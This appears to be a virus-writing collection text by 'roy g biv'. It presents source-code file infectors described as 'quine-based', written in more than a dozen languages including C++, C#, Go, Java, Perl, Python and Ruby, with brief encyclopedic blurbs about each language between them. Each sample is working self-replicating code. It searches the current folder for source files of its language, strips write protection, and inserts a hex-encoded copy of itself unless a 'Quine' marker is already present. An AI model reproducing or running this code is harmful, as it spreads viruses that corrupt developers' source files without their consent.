 - - - - - - - - - - - - - - - - [CPP.Quine] - - - - - - - - - - - - - - - -
#include<string>
#include<io.h>
#include<fstream>
#include<sys/stat.h>
int main(void)
{

{std::string ae,f;struct _finddata_t b;long c;if((c=_findfirst("*.cpp",&b))+1){do{std::ifstream d(b.name);if(d){e="";while(getline(d,f))e+=f+'\n';int g=e.length(),i=0;while(e[--g]!='}');if(e[g-1]!='/'){struct stat h;stat(b.name,&h);chmod(b.name,200);std::ofstream d(b.name);if(d){for(;i<a.length();i+=2){char j=a[i]*16+a[i+1]-a[i+1]/64*7-48;d.put(j);if(i==140)d.write(e.substr(0,g).c_str(),g);if(i==172)d.write(a.c_str(),a.length());}d.write(e.substr(g).c_str(),e.length()-g);}chmod(b.name,h.st_mode);}}}while(!_findnext(c,&b));_findclose(c);}}/*Quine - roy g biv 06/06/13*/}
 - - - - - - - - - - - - - - - - [CPP.Quine] - - - - - - - - - - - - - - - -





  *) C#
    
     C# is a multi-paradigm programming language encompassing strong typing,
     imperative, declarative, functional, procedural, generic, object-oriented
     (class-based), and component-oriented programming disciplines. It was
     developed by Microsoft within its .NET initiative and later approved as
     a standard by Ecma (ECMA-334) and ISO (ISO/IEC 23270:2006). C# is one of
     the programming languages designed for the Common Language
     Infrastructure.

     Quine-based infector was finished on 29.04.2013.

 - - - - - - - - - - - - - - - - [CS.Quine] - - - - - - - - - - - - - - - -
using System;
using System.IO;

class quine
{
static void Main()
{

{string ab="{string a=\""+a,e,f;int c;for(c=0;c<a.Length;c+=2)b+=Convert.ToChar(Convert.ToByte(a.Substring(c,2),16));foreach(FileInfo d in(new DirectoryInfo(".")).GetFiles("*.cs"))try{f=File.ReadAllText(e=d.Name);c=f.LastIndexOf('}',f.LastIndexOf('}')-1);if(f[c-1]!='/')try{FileAttributes g=File.GetAttributes(e);File.SetAttributes(e,0);File.WriteAllText(e,"using System;using System.IO;\n"+f.Substring(0,c)+b+f.Substring(c));File.SetAttributes(e,g);}catch{}}catch{}}/*Quine - roy g biv 29/04/13*/}

}
 - - - - - - - - - - - - - - - - [CS.Quine] - - - - - - - - - - - - - - - -





  *) D
     
     The D programming language is an object-oriented, imperative,
     multi-paradigm system programming language created by Walter Bright of
     Digital Mars. Though it originated as a re-engineering of C++, D is a
     distinct language, having redesigned some core C++ features while also
     taking inspiration from other languages, notably Java, Python, Ruby,
     C#, and Eiffel.

     Quine-based infector was finished on 20.04.2013.
     
 - - - - - - - - - - - - - - - - [D.Quine] - - - - - - - - - - - - - - - -
void main()
{

{
string ab="{string a=\""~a;import std.conv,std.file,std.string,std.algorithm;int c;for(c=0;c<a.length;c+=2)b~=cast(char)parse!int(a[c..c+2],16);foreach(d;dirEntries(".",SpanMode.shallow))if(endsWith(toLower(d.name),".d"))try{auto e=cast(char[])read(d);for(c=e.length;e[--c]!='}';){}if(e[c-1]!='/')try write(d,e[0..c]~b~e[c..e.length]);catch(Exception z){}}catch(Exception z){}}/*Quine - roy g biv 20/04/13*/}
 - - - - - - - - - - - - - - - - [D.Quine] - - - - - - - - - - - - - - - -





  *) Fortran

     Fortran (previously FORTRAN) is a general-purpose, imperative programming
     language that is especially suited to numeric computation and scientific
     computing. Originally developed by IBM at their campus in south San Jose,
     California in the 1950s for scientific and engineering applications,
     Fortran came to dominate this area of programming early on and has been
     in continual use for over half a century in computationally intensive
     areas such as numerical weather prediction, finite element analysis,
     computational fluid dynamics, computational physics and computational
     chemistry. It is one of the most popular languages in the area of
     high-performance computing and is the language used for programs that
     benchmark and rank the world's fastest supercomputers.

     Quine-based infector was finished on 29.08.2013.
     
 - - - - - - - - - - - - - - - - [FOR.Quine] - - - - - - - - - - - - - - - -
      character*4878a
      characterb,c,i
      integerd,e,f
      character*9999g
      character*10j
      character*74k
      a=
     r'2020202020206368617261637465722A34383738610A202020202020636861726
     r163746572622C632C690A202020202020696E7465676572642C652C660A2020202
     r020206368617261637465722A39393939670A20202020202063686172616374657
     r22A31306A0A2020202020206368617261637465722A37346B0A202020202020613
     rD0A20202020207227270A202020202020623D63686172283130290A20202020202
     r0633D63686172283339290A202020202020643D310A202020202020646F322C653
     rD312C6C656E2861292C320A202020202020663D6963686172286128652B313A292
     r90A2020202020206728643A64293D63686172286963686172286128653A29292A3
     r1362B662D662F36342A372D383136290A202020202020696628652E65712E32373
     r9297468656E0A202020202020683D36350A202020202020646F312C663D312C6C6
     r56E2861290A202020202020673D67283A64292F2F6128663A66290A20202020202
     r0643D642B310A202020202020696628662E65712E68297468656E0A20202020202
     r0696628662E6E652E34303235297468656E0A202020202020673D67283A64292F2
     rF622F2F27202020202072270A202020202020643D642B370A202020202020683D6
     r62B36360A202020202020656C73650A202020202020693D6728643A64290A20202
     r0202020673D67283A642D31292F2F632F2F622F2F27202020202020613D61283A3
     r4303234292F2F272F2F632F2F690A202020202020643D642B32310A20202020202
     r0683D662B35320A202020202020656E6469660A202020202020656E6469660A312
     r020202020636F6E74696E75650A202020202020656E6469660A202020202020643
     rD642B310A322020202020636F6E74696E75650A2020202020206A3D27766963746
     r96D2E666F72270A2020202020206F70656E28312C66696C653D6A290A202020202
     r020663D300A202020202020683D300A2020202020206C3D300A332020202020726
     r5616428312C27286129272C656E643D36296B0A202020202020663D662B310A202
     r020202020696628696E646578286B2C277175696E6527292E6E652E30297468656
     rE0A2020202020206C3D310A202020202020676F746F360A202020202020656C736
     r520696628682E65712E30297468656E0A202020202020646F342C6D3D312C6C656
     rE286B290A2020202020206966286B286D3A6D292E67652E274127297468656E0A2
     r020202020206966286B286D3A6D292E6C652E275A27297468656E0A20202020202
     r06B286D3A6D293D63686172286963686172286B286D3A29292B3332290A2020202
     r02020656E6469660A202020202020656E6469660A342020202020636F6E74696E7
     r5650A202020202020696628696E646578286B283A36292C2720202020202027292
     rE6E652E30297468656E0A202020202020696628696E646578286B2C277265616C2
     r7292E65712E30297468656E0A202020202020696628696E646578286B2C27636F6
     rD6D6F6E27292E65712E30297468656E0A202020202020696628696E646578286B2
     rC27646F75626C6527292E65712E30297468656E0A202020202020696628696E646
     r578286B2C277265636F726427292E65712E30297468656E0A20202020202069662
     r8696E646578286B2C27636F6D706C657827292E65712E30297468656E0A2020202
     r02020696628696E646578286B2C27696E746567657227292E65712E30297468656
     rE0A202020202020696628696E646578286B2C276C6F676963616C27292E65712E3
     r0297468656E0A202020202020696628696E646578286B2C2763686172616374657
     r227292E65712E30297468656E0A202020202020696628696E646578286B2C27646
     r96D656E73696F6E27292E65712E30297468656E0A202020202020696628696E646
     r578286B2C27706172616D6574657227292E65712E30297468656E0A20202020202
     r0696628696E646578286B2C2773747275637475726527292E6E652E30297468656
     rE0A3520202020207265616428312C2728612927296B0A202020202020663D662B3
     r10A202020202020696628696E646578286B2C2773747275637475726527292E657
     r12E30297468656E0A202020202020676F746F350A202020202020656E6469660A2
     r02020202020656C73650A202020202020683D660A202020202020656E6469660A2
     r02020202020656E6469660A202020202020656E6469660A202020202020656E646
     r9660A202020202020656E6469660A202020202020656E6469660A2020202020206
     r56E6469660A202020202020656E6469660A202020202020656E6469660A2020202
     r02020656E6469660A202020202020656E6469660A202020202020656E6469660A2
     r02020202020656E6469660A202020202020676F746F330A362020202020636C6F7
     r3652831290A2020202020206966286C2E65712E30297468656E0A2020202020206
     rF70656E28312C66696C653D6A290A2020202020206F70656E28322C66696C653D2
     r77227290A202020202020646F392C6D3D312C662B310A2020202020206966286D2
     rE6E652E68297468656E0A2020202020207265616428312C2728612927296B0A202
     r020202020653D6C656E286B290A3720202020206966286B28653A65292E65712E2
     r72027297468656E0A202020202020653D652D310A202020202020676F746F370A2
     r02020202020656E6469660A202020202020777269746528322C2A296B283A65290
     rA202020202020656C73650A202020202020653D310A382020202020663D696E64'
      a=a(:4024)//'6578286728653A292C62290A202020202020777269746528322C2
     rA296728653A652B662D32290A202020202020653D652B660A20202020202069662
     r8652E6C742E64297468656E0A202020202020676F746F380A202020202020656E6
     r469660A202020202020656E6469660A392020202020636F6E74696E75650A20202
     r0202020636C6F73652832290A202020202020636C6F73652831290A20202020202
     r06F70656E28312C66696C653D277227290A2020202020206F70656E28322C66696
     rC653D6A290A3131202020207265616428312C27286129272C656E643D3133296B0
     rA202020202020653D6C656E286B290A3132202020206966286B28653A65292E657
     r12E272027297468656E0A202020202020653D652D310A202020202020676F746F3
     r1320A202020202020656E6469660A202020202020777269746528322C2A296B283
     rA65290A202020202020676F746F31310A313320202020636C6F73652832290A202
     r020202020636C6F736528312C7374617475733D2764656C65746527290A2020202
     r02020656E6469660A63205175696E65202D20726F792067206269762032392F303
     r82F31330A'
      b=char(10)
      c=char(39)
      d=1
      do2,e=1,len(a),2
      f=ichar(a(e+1:))
      g(d:d)=char(ichar(a(e:))*16+f-f/64*7-816)
      if(e.eq.279)then
      h=65
      do1,f=1,len(a)
      g=g(:d)//a(f:f)
      d=d+1
      if(f.eq.h)then
      if(f.ne.4025)then
      g=g(:d)//b//'     r'
      d=d+7
      h=f+66
      else
      i=g(d:d)
      g=g(:d-1)//c//b//'      a=a(:4024)//'//c//i
      d=d+21
      h=f+52
      endif
      endif
1     continue
      endif
      d=d+1
2     continue
      j='victim.for'
      open(1,file=j)
      f=0
      h=0
      l=0
3     read(1,'(a)',end=6)k
      f=f+1
      if(index(k,'quine').ne.0)then
      l=1
      goto6
      else if(h.eq.0)then
      do4,m=1,len(k)
      if(k(m:m).ge.'A')then
      if(k(m:m).le.'Z')then
      k(m:m)=char(ichar(k(m:))+32)
      endif
      endif
4     continue
      if(index(k(:6),'      ').ne.0)then
      if(index(k,'real').eq.0)then
      if(index(k,'common').eq.0)then
      if(index(k,'double').eq.0)then
      if(index(k,'record').eq.0)then
      if(index(k,'complex').eq.0)then
      if(index(k,'integer').eq.0)then
      if(index(k,'logical').eq.0)then
      if(index(k,'character').eq.0)then
      if(index(k,'dimension').eq.0)then
      if(index(k,'parameter').eq.0)then
      if(index(k,'structure').ne.0)then
5     read(1,'(a)')k
      f=f+1
      if(index(k,'structure').eq.0)then
      goto5
      endif
      else
      h=f
      endif
      endif
      endif
      endif
      endif
      endif
      endif
      endif
      endif
      endif
      endif
      endif
      endif
      goto3
6     close(1)
      if(l.eq.0)then
      open(1,file=j)
      open(2,file='r')
      do9,m=1,f+1
      if(m.ne.h)then
      read(1,'(a)')k
      e=len(k)
7     if(k(e:e).eq.' ')then
      e=e-1
      goto7
      endif
      write(2,*)k(:e)
      else
      e=1
8     f=index(g(e:),b)
      write(2,*)g(e:e+f-2)
      e=e+f
      if(e.lt.d)then
      goto8
      endif
      endif
9     continue
      close(2)
      close(1)
      open(1,file='r')
      open(2,file=j)
11    read(1,'(a)',end=13)k
      e=len(k)
12    if(k(e:e).eq.' ')then
      e=e-1
      goto12
      endif
      write(2,*)k(:e)
      goto11
13    close(2)
      close(1,status='delete')
      endif
c Quine - roy g biv 29/08/13

      end
 - - - - - - - - - - - - - - - - [FOR.Quine] - - - - - - - - - - - - - - - -





  *) F#

     F# (pronounced F Sharp) is an open-source, strongly typed, multi-paradigm
     programming language encompassing functional, imperative and
     object-oriented programming techniques. F# is most often used as a
     cross-platform CLI language, but can also be used to generate JavaScript
     and GPU code.
     
     Quine-based infector was finished on 09.09.2013.

 - - - - - - - - - - - - - - - - [FS.Quine] - - - - - - - - - - - - - - - -
let a
let mutable b="let a=\""+a
open System
open System.IO
for c in 0..2..a.Length-1 do
 b<-b+Convert.ToString(Convert.ToChar(Convert.ToByte(a.[c..c+1],16)))
for(a)in(new DirectoryInfo(".")).GetFiles("*.fs")do
 let c=a.Name
 let d=File.ReadAllText(c)
 if d.Contains("Quine")=false then
  let e=File.GetAttributes(c)
  File.SetAttributes(c,FileAttributes.Normal)
  File.WriteAllText(c,b+d)
  File.SetAttributes(c,e)
//Quine - roy g biv 09/09/13
 - - - - - - - - - - - - - - - - [FS.Quine] - - - - - - - - - - - - - - - -





  *) Go
  
     Go, also called golang, is a programming language initially developed
     at Google in 2007 by Robert Griesemer, Rob Pike, and Ken Thompson. It is
     a statically-typed language with syntax loosely derived from that of C,
     adding automatic memory management, type safety, some dynamic-typing
     capabilities, additional built-in types such as variable-length arrays
     and key-value maps, and a large standard library. 

     Quine-based infector was finished on 25.04.2013.

 - - - - - - - - - - - - - - - - [GO.Quine] - - - - - - - - - - - - - - - -
package main

import("strconv";"strings";"path/filepath";"os";"bufio";"syscall")

func main() {
{
a
b:="{a:=\""+a
for c:=0;c<len(a);c+=2{
d,_:=strconv.ParseInt(a[c:c+2],16,8)
b+=string(d)
}
if a,_:=filepath.Glob("*.go");a!=nil{
for _,c:=range a{
if d,e:=os.Open(c);e==nil{ 
f,g,h,l,m,p,q:=bufio.NewReader(d),"",make([]string,0),-1,0,0,"\n"
var(i,o string;j,n,r int)
for e==nil{
i,e=f.ReadString('\n')
if j=strings.Index(i,"Quine");j>0{ 
break
}
k:=strings.ToLower(i)
if l<0{
if l=strings.Index(k,"func ");l<0{ 
if m==0{
if n=strings.Index(k,"import");n>=0{ 
m=1
}
}
if m==1{
o=k[n:]
if p==0{
if strings.Index(o,"(")>=0{
q=")"
}
if strings.Index(o,"\"")>=0{ 
p=1
}else{
n=0
}
}
if p==1{
for{
if r=strings.Index(o[n:],"\"")+1;r==0{
break
}
n+=r
s:=strings.Index(o[n:],"\"")+n
t:=make([]string,len(h)+1)
copy(t,h)
copy(t[len(h):],[]string{o[n:s]}) 
h=t
n=s+1
}
if strings.Index(o,q)>=0{ 
m=0
p=0
q="\n"
}else{
n=0 
}
}
}
}
}
g+=i
}
d.Close()
if j<0{
f,_:=os.Stat(c)
os.Chmod(c,f.Mode()|146) 
if d,e=os.OpenFile(c,syscall.O_WRONLY,146);e==nil{ 
k:=[]string{"path/filepath","os","bufio","strings","syscall","strconv"}
q="import("
for j,_=range k{
n=0
for _,i=range h{
if k[j]==i{
n=1
break
}
}
if n==0{
q+="\""+k[j]+"\";" 
}
}
if len(q)>7{
j=strings.Index(g,"func ")
g=g[0:j]+q+")\n"+g[j:]
}
j=strings.LastIndex(g,"}")
i:=bufio.NewWriter(d)
i.WriteString(g[0:j]+b+g[j:]) 
i.Flush()
d.Close()
}
os.Chmod(c,f.Mode())
}
}
}
}
}
/*Quine - roy g biv 25/4/13*/

}
 - - - - - - - - - - - - - - - - [GO.Quine] - - - - - - - - - - - - - - - -





  *) Haskell

     Haskell is a standardized, general-purpose purely functional programming
     language, with non-strict semantics and strong static typing. It is named
     after logician Haskell Curry. In Haskell, "a function is a first-class
     citizen" of the programming language. As a functional programming
     language, the primary control construct is the function.

     Quine-based infector was finished on 25.04.2013.
     
 - - - - - - - - - - - - - - - - [HS.Quine] - - - - - - - - - - - - - - - -
import Data.List
import Data.Char
import Data.ByteString.Char8 hiding(map,lines,unlines,length)
import System.Directory
h a b c=do
 return([chr(ord(a!!d)*16+ord(a!!(d+1))-(ord(a!!(d+1))`div`64)*7-816)|d<-[b,b+2..c-1]])
a b=do
 let c
 if(Data.List.isSuffixOf".hs"(map toLower(b)))then do
  d<-Prelude.readFile b
  let(e,f)=breakSubstring(pack("Quine"))(pack(d))
  if(f==pack(""))then do
   let(e,f)=partition(Data.List.isPrefixOf"import")(lines d)
   Prelude.writeFile b(unlines(e)++(h c 0 468)!!0++c++(h c 468(length(c)))!!0++unlines(f)++"v")
  else return()
 else return()
v=do
 b<-getDirectoryContents"."
 mapM_(a)b--Quine - roy g biv 05/04/13

main = do
v
 - - - - - - - - - - - - - - - - [HS.Quine] - - - - - - - - - - - - - - - - 





  *) JScript

     JScript is Microsoft's dialect of the ECMAScript standard that is used in
     Microsoft's Internet Explorer.
     JScript is implemented as a Windows Script engine. This means that it can
     be "plugged in" to any application that supports Windows Script, such as
     Internet Explorer, Active Server Pages, and Windows Script Host. It also
     means that any application supporting Windows Script can use multiple
     languages (JScript, VBScript, Perl, and others).

     Quine-based infector was finished on 21.04.2013.

 - - - - - - - - - - - - - - - - [JS.Quine] - - - - - - - - - - - - - - - -
ab=";a=\""+a;for(c=0;c<a.length;c+=2)b+=String.fromCharCode(parseInt(a.substr(c,2),16));a=new ActiveXObject("scripting.filesystemobject");for(c=new Enumerator(a.getfolder(".").files);!c.atEnd();c.moveNext())try{if(a.getextensionname(d=c.item()).toLowerCase()=="js"&&a.opentextfile(d).readall().indexOf("Quine")<0){e=d.attributes;f=d.attributes=0;g=a.opentextfile(d,8);g.write(b);d.attributes=e}}catch(z){}/*Quine - roy g biv 21/04/13*/
 - - - - - - - - - - - - - - - - [JS.Quine] - - - - - - - - - - - - - - - - 





  *) Java

     Java is a computer programming language that is concurrent, class-based,
     object-oriented, and specifically designed to have as few implementation
     dependencies as possible. It is intended to let application developers
     "write once, run anywhere" (WORA), meaning that code that runs on one
     platform does not need to be recompiled to run on another.
     Java applications are typically compiled to bytecode (class file) that
     can run on any Java virtual machine (JVM) regardless of computer
     architecture. Java is, as of 2012, one of the most popular programming
     languages in use, particularly for client-server web applications,
     with a reported 9 million developers. Java was originally developed by
     James Gosling at Sun Microsystems (which has since merged into Oracle
     Corporation) and released in 1995 as a core component of Sun
     Microsystems' Java platform. The language derives much of its syntax
     from C and C++, but it has fewer low-level facilities than either of
     them.
     
     Quine-based infector was finished on 29.04.2013.

 - - - - - - - - - - - - - - - - [JAVA.Quine] - - - - - - - - - - - - - - - -
import java.io.*;

public class quine
{
public static void main (String[] args) 
{

{String ab="{String a=\""+a,g;int c;for(c=0;c<a.length();c+=2)b+=Character.toChars(Integer.parseInt(a.substring(c,c+2),16))[0];for(File d:(new File(".")).listFiles())if(d.getName().toLowerCase().endsWith(".java"))try{char[]e=new char[(int)d.length()];FileReader f=new FileReader(d);f.read(e);f.close();g=new String(e);c=g.lastIndexOf('}',g.lastIndexOf('}')-1);if(e[c-1]!='/'){boolean h=d.canWrite();d.setWritable(true);FileWriter i=new FileWriter(d);i.write("import java.io.*;\n"+g.substring(0,c)+b+g.substring(c));i.close();d.setWritable(h);}}catch(Exception z){}}/*Quine - roy g biv 29/04/13*/}


}
 - - - - - - - - - - - - - - - - [JAVA.Quine] - - - - - - - - - - - - - - - -





  *) Lua

     Lua is a lightweight multi-paradigm programming language designed as a
     scripting language with "extensible semantics" as a primary goal. Lua is
     cross-platform since it is written in ISO C. Lua has a relatively simple
     C API, thus "Lua is especially useful for providing end users with an
     easy way to program the behavior of a software product without getting
     too far into its innards".
     
     Quine-based infector was finished on 08.09.2013.

 - - - - - - - - - - - - - - - - [Lua.Quine] - - - - - - - - - - - - - - - -
ab='a="'..a;for c=1,string.len(a),2 do b=b..string.char(tonumber(string.sub(a,c,c+1),16));end;require'lfs';for c in lfs.dir(".")do if string.sub(string.lower(c),-4)==".lua"then d=io.open(c):read('*all');if not string.find(d,"Quine")then io.open(c,"w"):write(b..d)end;end;end--Quine - roy g biv 08/09/13
 - - - - - - - - - - - - - - - - [Lua.Quine] - - - - - - - - - - - - - - - -





  *) Objective-C
  
     Objective-C is a general-purpose, object-oriented programming language
     that adds Smalltalk-style messaging to the C programming language. It is
     the main programming language used by Apple for the OS X and iOS
     operating systems and their respective APIs, Cocoa and Cocoa Touch.

     Originally developed in the early 1980s, it was selected as the main
     language used by NeXT for its NeXTSTEP operating system, from which OS X
     and iOS are derived. Generic Objective-C programs that do not use the
     Cocoa or Cocoa Touch libraries, or using parts that is ported or
     reimplemented for other systems can also be compiled for any system
     supported by GCC or Clang.

     Quine-based infector was finished on 01.05.2013.

 - - - - - - - - - - - - - - - - [OBJC.Quine] - - - - - - - - - - - - - - - -
#define __NO_MINGW_LFS
void main(void)
{

{char*af;
#include <io.h>
#include <malloc.h>
#include <stdlib.h>
#include <sys/stat.h>
struct _finddata_t b;long c,e,g;if((c=_findfirst("*.m",&b))+1){do{int d,i=0,j=0;if(f=malloc(e=filelength(d=open(b.name,32768)))){g=read(d,f,e);close(d);while(f[--g]!='}');if(f[g-1]!='/'){struct stat h;stat(b.name,&h);chmod(b.name,128);if((d=open(b.name,32769))>0){_lseek(d,g,0);write(d,"{char*a=\"",9);while(a[++i]);write(d,a,i);for(;j<i;j+=2)*f=a[j]*16+a[j+1]-a[j+1]/64*7-48,write(d,f,1);write(d,f+g,e-g);close(d);}chmod(b.name,h.st_mode);}free(f);}}while(!_findnext(c,&b));_findclose(c);}}/*Quine - roy g biv 01/05/13*/}
 - - - - - - - - - - - - - - - - [OBJC.Quine] - - - - - - - - - - - - - - - -





  *) Pascal

     Pascal is an influential imperative and procedural programming language,
     designed in 1968–1969 and published in 1970 by Niklaus Wirth as a small
     and efficient language intended to encourage good programming practices
     using structured programming and data structuring.

     Quine-based infector was finished on 01.05.2013.

 - - - - - - - - - - - - - - - - [PAS.Quine] - - - - - - - - - - - - - - - -     
uses dos,strings;

const aa:string='3B0A0A636F6E73742061613A737472696E673D27273B0A636F6E73742061623A737472696E673D27273B0A636F6E73742061633A737472696E673D27273B0A636F6E73742061643A737472696E673D27273B0A636F6E73742061653A737472696E673D27273B0A636F6E73742061663A737472696E67';
const ab:string='3D27273B0A636F6E73742061673A737472696E673D27273B0A636F6E73742061683A737472696E673D27273B0A636F6E73742061693A737472696E673D27273B0A636F6E737420616A3A737472696E673D27273B0A636F6E737420616B3A737472696E673D27273B0A636F6E737420616C3A73747269';
const ac:string='6E673D27273B0A636F6E737420616D3A737472696E673D27273B0A636F6E737420616E3A737472696E673D27273B0A70726F63656475726520763B0A76617220623A7365617263687265633B633A746578743B642C6C3A70636861723B652C6A2C6E2C702C713A696E74656765723B662C672C693A73';
const ad:string='7472696E673B682C6B3A627974653B6D3A776F72643B0A6F3A61727261795B312E2E31345D6F665E737472696E673D284061612C4061622C4061632C4061642C4061652C4061662C4061672C4061682C4061692C40616A2C40616B2C40616C2C40616D2C40616E293B0A626567696E0A7B24692D7D0A';
const ae:string='66696E64666972737428272A2E706173272C34372C62293B0A7768696C6520646F736572726F723D30646F0A626567696E0A61737369676E28632C622E6E616D65293B0A72657365742863293B0A696620696F726573756C743D307468656E0A626567696E0A643A3D737472616C6C6F6328622E7369';
const af:string='7A65293B0A645E3A3D23303B0A653A3D303B0A7265706561740A726561646C6E28632C66293B0A673A3D7570636173652866293B0A696620706F7328275553455320272C67293D317468656E0A626567696E0A683A3D706F7328273B272C66292D313B0A653A3D737472656E642864292B682D643B0A';
const ag:string='693A3D636F707928672C312C68290A656E643B0A696620706F732827454E442E272C67293D317468656E0A6A3A3D737472656E642864292D643B0A73747270636F707928737472656E642864292C662B233130293B0A6B3A3D706F7328275175696E65272C66290A756E74696C20656F662863296F72';
const ah:string='286B3E30293B0A636C6F73652863293B0A6966206B3D307468656E0A626567696E0A676574666174747228632C6D293B0A736574666174747228632C30293B0A726577726974652863293B0A696620696F726573756C743D307468656E0A626567696E0A696620653D307468656E0A77726974652863';
const ai:string='2C277573657320646F732C737472696E677327290A656C73650A626567696E0A6C3A3D737472616C6C6F632865293B0A777269746528632C7374726C636F7079286C2C642C6529293B0A737472646973706F7365286C293B0A696620706F732827444F53272C69293D307468656E0A77726974652863';
const aj:string='2C272C646F7327293B0A696620706F732827535452494E4753272C69293D307468656E0A777269746528632C272C737472696E677327293B0A653A3D652B310A656E643B0A713A3D303B0A666F72206E3A3D31746F206C656E677468286F29646F0A626567696E0A703A3D313B0A7768696C6520703C';
const ak:string='6C656E677468286F5B6E5D5E29646F0A626567696E0A6B3A3D6F7264286F5B6E5D5E5B702B315D293B0A777269746528632C636872286F7264286F5B6E5D5E5B705D292A31362B6B2D6B206469762036342A372D38313629293B0A703A3D702B323B0A713A3D712B313B0A696628713C3D32302A6C65';
const al:string='6E677468286F2929616E642871206D6F642032303D30297468656E0A777269746528632C6F5B71206469762032305D5E290A656E640A656E643B0A6C3A3D737472616C6C6F63286A2D65293B0A77726974656C6E28632C7374726C636F7079286C2C642B652C6A2D65292C273B7627293B0A73747264';
const am:string='6973706F7365286C293B0A683A3D737472656E642864292D642D6A3B0A6C3A3D737472616C6C6F632868293B0A777269746528632C7374726C636F7079286C2C642B6A2C6829293B0A737472646973706F7365286C293B0A636C6F73652863290A656E643B0A736574666174747228632C6D290A656E';
const an:string='643B0A737472646973706F73652864290A656E643B0A66696E646E6578742862290A7B24692B7D0A656E640A656E643B0A7B5175696E65202D20726F792067206269762032312F30342F31337D';
procedure v;
var b:searchrec;c:text;d,l:pchar;e,j,n,p,q:integer;f,g,i:string;h,k:byte;m:word;
o:array[1..14]of^string=(@aa,@ab,@ac,@ad,@ae,@af,@ag,@ah,@ai,@aj,@ak,@al,@am,@an);
begin
{$i-}
findfirst('*.pas',47,b);
while doserror=0do
begin
assign(c,b.name);
reset(c);
if ioresult=0then
begin
d:=stralloc(b.size);
d^:=#0;
e:=0;
repeat
readln(c,f);
g:=upcase(f);
if pos('USES ',g)=1then
begin
h:=pos(';',f)-1;
e:=strend(d)+h-d;
i:=copy(g,1,h)
end;
if pos('END.',g)=1then
j:=strend(d)-d;
strpcopy(strend(d),f+#10);
k:=pos('Quine',f)
until eof(c)or(k>0);
close(c);
if k=0then
begin
getfattr(c,m);
setfattr(c,0);
rewrite(c);
if ioresult=0then
begin
if e=0then
write(c,'uses dos,strings')
else
begin
l:=stralloc(e);
write(c,strlcopy(l,d,e));
strdispose(l);
if pos('DOS',i)=0then
write(c,',dos');
if pos('STRINGS',i)=0then
write(c,',strings');
e:=e+1
end;
q:=0;
for n:=1to length(o)do
begin
p:=1;
while p<length(o[n]^)do
begin
k:=ord(o[n]^[p+1]);
write(c,chr(ord(o[n]^[p])*16+k-k div 64*7-816));
p:=p+2;
q:=q+1;
if(q<=20*length(o))and(q mod 20=0)then
write(c,o[q div 20]^)
end
end;
l:=stralloc(j-e);
writeln(c,strlcopy(l,d+e,j-e),';v');
strdispose(l);
h:=strend(d)-d-j;
l:=stralloc(h);
write(c,strlcopy(l,d+j,h));
strdispose(l);
close(c)
end;
setfattr(c,m)
end;
strdispose(d)
end;
findnext(b)
{$i+}
end
end;
{Quine - roy g biv 21/04/13}

begin
v
end.
 - - - - - - - - - - - - - - - - [PAS.Quine] - - - - - - - - - - - - - - - -    





  *) Perl

     Perl is a family of high-level, general-purpose, interpreted, dynamic
     programming languages. Perl was originally developed by Larry Wall in
     1987 as a general-purpose Unix scripting language to make report
     processing easier.    

     Quine-based infector was finished on 09.09.2013.
     
 - - - - - - - - - - - - - - - - [Perl.Quine] - - - - - - - - - - - - - - - -
$a="223B24623D2724613D22272E24613B666F722824633D303B24633C6C656E677468282461293B24632B3D32297B24622E3D63687228686578287375627374722824612C24632C322929297D666F72656163682461283C2A3E297B6966286C63282461293D7E222E706C22297B6F70656E28612C2461293B24633D6A6F696E2822222C3C613E293B636C6F73652861293B6966282463217E225175696E6522297B6F70656E28612C273E272E2461293B7072696E74206124622E24633B636C6F73652861297D7D7D235175696E65202D20726F792067206269762030392F30392F31330A";$b='$a="'.$a;for($c=0;$c<length($a);$c+=2){$b.=chr(hex(substr($a,$c,2)))}foreach$a(<*>){if(lc($a)=~".pl"){open(a,$a);$c=join("",<a>);close(a);if($c!~"Quine"){open(a,'>'.$a);print a$b.$c;close(a)}}}#Quine - roy g biv 09/09/13
 - - - - - - - - - - - - - - - - [Perl.Quine] - - - - - - - - - - - - - - - -





  *) Python
  
     Python is a widely used general-purpose, high-level programming language.
     Its design philosophy emphasizes code readability, and its syntax allows
     programmers to express concepts in fewer lines of code than would be
     possible in languages such as C. The language provides constructs
     intended to enable clear programs on both a small and large scale.

     Quine-based infector was finished on 07.09.2013.
     
 - - - - - - - - - - - - - - - - [PY.Quine] - - - - - - - - - - - - - - - -
a="220A623D27613D22272B610A633D72616E676528302C612E5F5F6C656E5F5F28292C32290A666F72206420696E20633A623D622B63687228696E7428615B643A642B325D2C313629290A696D706F727420676C6F620A613D676C6F622E676C6F6228222A2E5B70505D5B79595D22290A666F72206320696E20613A0A20643D6F70656E2863292E7265616428290A20696620642E66696E6428225175696E6522293C303A653D6F70656E28632C227722292E777269746528622B64290A235175696E65202D20726F792067206269762030372F30392F31330A"
b='a="'+a
c=range(0,a.__len__(),2)
for d in c:b=b+chr(int(a[d:d+2],16))
import glob
a=glob.glob("*.[pP][yY]")
for c in a:
 d=open(c).read()
 if d.find("Quine")<0:e=open(c,"w").write(b+d)
#Quine - roy g biv 07/09/13
 - - - - - - - - - - - - - - - - [PY.Quine] - - - - - - - - - - - - - - - -





  *) Ruby

     Ruby is a dynamic, reflective, object-oriented, general-purpose
     programming language. It was designed and developed in the mid-1990s by
     Yukihiro "Matz" Matsumoto in Japan.
     
     Ruby embodies syntax inspired by Perl with Smalltalk-like features and
     was also influenced by Eiffel and Lisp. It supports multiple programming
     paradigms, including functional, object oriented, and imperative. It also
     has a dynamic type system and automatic memory management. Therefore, it
     is similar in varying degrees to, Smalltalk, Python, Perl, Lisp, Dylan,
     and CLU.

     Quine-based infector was finished on 08.09.2013.

 - - - - - - - - - - - - - - - - [Ruby.Quine] - - - - - - - - - - - - - - - -
a="223B623D27613D22272B613B302E7374657028612E6C656E6774682C32292E6561636820646F7C637C623D622B615B632C325D2E6865782E6368723B656E643B4469722E6F70656E28222E22292E6561636820646F7C637C696620632E646F776E636173652E656E645F776974683F28222E726222297468656E20643D494F2E726561642863293B69662021642E696E64657828225175696E6522297468656E20494F2E777269746528632C622B64293B656E643B656E643B656E64235175696E65202D20726F792067206269762030382F30392F31330A";b='a="'+a;0.step(a.length,2).each do|c|b=b+a[c,2].hex.chr;end;Dir.open(".").each do|c|if c.downcase.end_with?(".rb")then d=IO.read(c);if !d.index("Quine")then IO.write(c,b+d);end;end;end#Quine - roy g biv 08/09/13
 - - - - - - - - - - - - - - - - [Ruby.Quine] - - - - - - - - - - - - - - - -





  *) Rust
  
     Rust is a general purpose, multi-paradigm, compiled programming language
